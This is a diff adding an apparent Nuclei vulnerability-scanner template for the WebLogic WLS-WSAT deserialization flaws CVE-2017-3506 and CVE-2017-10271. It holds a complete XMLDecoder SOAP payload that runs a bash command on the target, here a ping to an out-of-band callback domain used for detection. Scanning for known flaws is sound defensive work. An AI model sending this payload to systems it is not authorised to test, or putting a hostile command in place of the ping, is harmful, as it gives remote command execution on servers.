@@ -1,0 +1,47 @@
+id: weblogic-wls-wsat-rce
+info:
+  name: Weblogic WLS-WSAT Remote Code Execution (CVE-2017-3506, CVE-2017-10271)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: weblogic,dnslog,rce,cve-2017-3506,cve-2017-10271
+
+variables:
+  reverseDomain: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /wls-wsat/CoordinatorPortType HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
+        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+        <java version="1.4.0" class="java.beans.XMLDecoder">
+        <void class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="3">
+        <void index="0">
+        <string>/bin/bash</string>
+        </void>
+        <void index="1">
+        <string>-c</string>
+        </void>
+        <void index="2">
+        <string>ping -nc 2 {{reverseDomain}}</string>
+        </void>
+        </array>
+        <void method="start"/></void>
+        </java>
+        </work:WorkContext>
+        </soapenv:Header>
+        <soapenv:Body/>
+        </soapenv:Envelope>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "ping"
